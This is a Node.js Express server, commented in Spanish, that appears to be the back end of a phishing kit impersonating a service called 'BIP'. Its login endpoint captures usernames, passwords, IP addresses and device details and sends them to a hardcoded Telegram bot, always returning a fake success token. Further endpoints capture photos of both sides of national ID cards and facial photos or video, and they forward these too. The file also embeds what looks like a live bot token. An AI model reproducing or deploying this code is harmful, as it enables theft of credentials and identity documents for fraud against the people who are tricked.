// Servidor simple para capturar datos y enviar a Telegram
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

// Configuración Telegram
const TELEGRAM_BOT_TOKEN = '8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY';
const TELEGRAM_CHAT_ID = '8523843948';

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Función para enviar a Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('✅ Mensaje enviado a Telegram');
    return true;
  } catch (error) {
    console.error('❌ Error Telegram:', error.message);
    return false;
  }
}

// Función para enviar foto a Telegram
async function sendPhotoToTelegram(photoBase64, caption) {
  try {
    const base64Data = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
    const buffer = Buffer.from(base64Data, 'base64');
    
    const FormData = require('form-data');
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('photo', buffer, { filename: 'photo.jpg' });
    form.append('caption', caption);
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });
    console.log('✅ Foto enviada a Telegram');
    return true;
  } catch (error) {
    console.error('❌ Error enviando foto:', error.message);
    return false;
  }
}

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// LOGIN - Captura usuario y contraseña
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'N/A';
  const userAgent = req.headers['user-agent'] || 'N/A';
  
  console.log('📥 LOGIN recibido:', username);
  
  const message = `
🔐 <b>NUEVO LOGIN - BIP</b>

👤 <b>Usuario:</b> <code>${username}</code>
🔑 <b>Contraseña:</b> <code>${password}</code>

🌐 <b>IP:</b> ${ip}
📱 <b>Dispositivo:</b> ${userAgent.substring(0, 100)}
🕐 <b>Fecha:</b> ${new Date().toLocaleString('es-AR')}
`;

  await sendToTelegram(message);
  
  // Siempre responder éxito
  res.json({
    token: 'jwt-token-' + Date.now(),
    user: {
      id: Date.now().toString(),
      username: username,
      name: username,
      email: username + '@bip.com'
    }
  });
});

// DNI - Captura fotos del DNI
app.post('/api/verification/dni', async (req, res) => {
  const { frontImage, backImage } = req.body;
  
  console.log('📥 DNI recibido');
  console.log('   Frente:', frontImage ? frontImage.length + ' chars' : 'NO');
  console.log('   Dorso:', backImage ? backImage.length + ' chars' : 'NO');
  
  await sendToTelegram(`📄 <b>DNI RECIBIDO</b>\n\n🕐 ${new Date().toLocaleString('es-AR')}`);
  
  // Enviar fotos
  if (frontImage) {
    await sendPhotoToTelegram(frontImage, '📄 DNI - FRENTE');
  }
  if (backImage) {
    await sendPhotoToTelegram(backImage, '📄 DNI - DORSO');
  }
  
  res.json({ success: true, message: 'DNI verificado' });
});

// FACIAL - Captura video/fotos faciales
app.post('/api/verification/facial', async (req, res) => {
  const { faceVideo, faceImage, facePhotos } = req.body;
  
  console.log('📥 FACIAL recibido');
  console.log('   Video:', faceVideo ? faceVideo.length + ' chars' : 'NO');
  console.log('   Imagen:', faceImage ? faceImage.length + ' chars' : 'NO');
  console.log('   Fotos múltiples:', facePhotos ? facePhotos.length + ' fotos' : 'NO');
  
  await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL COMPLETADA</b>\n\n✅ ${facePhotos ? facePhotos.length + ' fotos' : faceVideo ? 'Video' : 'Imagen'} recibido\n🕐 ${new Date().toLocaleString('es-AR')}`);
  
  // Enviar fotos múltiples si existen
  if (facePhotos && facePhotos.length > 0) {
    console.log('📸 Enviando', facePhotos.length, 'fotos faciales...');
    for (let i = 0; i < facePhotos.length; i++) {
      try {
        await sendPhotoToTelegram(facePhotos[i], `👤 Foto Facial ${i + 1}/${facePhotos.length}`);
        // Pequeña pausa entre fotos
        if (i < facePhotos.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      } catch (error) {
        console.log(`⚠️ Error enviando foto ${i + 1}:`, error.message);
      }
    }
    console.log('✅ Todas las fotos faciales enviadas');
  }
  // Si hay video, intentar enviarlo
  else if (faceVideo) {
    try {
      const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
      const buffer = Buffer.from(base64Data, 'base64');
      
      const FormData = require('form-data');
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('video', buffer, { filename: 'facial.webm' });
      form.append('caption', '👤 Video Verificación Facial');
      
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, form, {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      });
      console.log('✅ Video enviado');
    } catch (error) {
      console.log('⚠️ Error enviando video:', error.message);
    }
  }
  // Si hay imagen única
  else if (faceImage) {
    try {
      await sendPhotoToTelegram(faceImage, '👤 Foto Verificación Facial');
      console.log('✅ Foto facial enviada');
    } catch (error) {
      console.log('⚠️ Error enviando foto:', error.message);
    }
  }
  
  res.json({ success: true, message: 'Verificación facial completada' });
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor corriendo en http://0.0.0.0:${PORT}`);
  console.log(`📱 Telegram configurado: ${TELEGRAM_CHAT_ID}`);
  
  // Test de conexión a Telegram
  sendToTelegram('🟢 <b>Servidor BIP iniciado</b>\n\n' + new Date().toLocaleString('es-AR'));
});

// Mantener vivo
process.on('uncaughtException', (err) => {
  console.error('Error no capturado:', err);
});

process.on('unhandledRejection', (err) => {
  console.error('Promesa rechazada:', err);
});
